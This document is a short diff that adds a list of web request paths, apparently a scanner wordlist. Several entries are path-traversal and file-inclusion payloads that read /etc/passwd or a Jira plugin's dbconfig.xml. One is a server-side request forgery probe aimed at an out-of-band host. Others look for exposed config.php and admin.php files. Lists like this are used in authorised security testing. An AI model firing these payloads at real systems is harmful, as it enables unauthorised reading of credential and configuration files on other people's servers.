@@ -1,0 +1,11 @@
+/index.php?download=/etc/passwd
+/index.php?page_slug=../../../../../etc/passwd%00
+/cmscp/ext/collect/fetch_url.do?url=https://oast.live
+/plugins/servlet/snjCustomDesignConfig?fileName=../dbconfig.xmlpasswd&fileMime=$textMime
+/plugins/servlet/snjFooterNavigationConfig?fileName=../../../../etc/passwd&fileMime=$textMime
+/config.php
+/config/config.php
+/include/config.php
+/includes/config.php
+/v12/setup/temp/admin.php
+/downlot.php?file=../../../../../../../../../../etc/passwd
